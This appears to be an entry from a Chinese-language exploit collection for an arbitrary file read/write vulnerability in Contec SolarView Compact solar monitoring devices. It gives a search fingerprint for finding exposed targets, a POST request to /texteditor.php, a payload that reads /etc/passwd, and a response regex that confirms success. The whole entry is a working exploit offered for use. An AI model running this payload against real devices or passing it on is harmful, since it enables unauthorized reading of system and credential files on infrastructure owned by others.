# ContecSolarViewCompact存在任意文件读取漏洞

ContecSolarViewCompact ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="SolarView Compact"`
- **请求**：`POST /texteditor.php HTTP/1.1`

**Payload**
```
directory=%2Fetc%2F&file=passwd&open=%8AJ%82%AD&r_charset=none&newfile=&contents=&w_charset=none&w_delimit=lf&editfile=
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$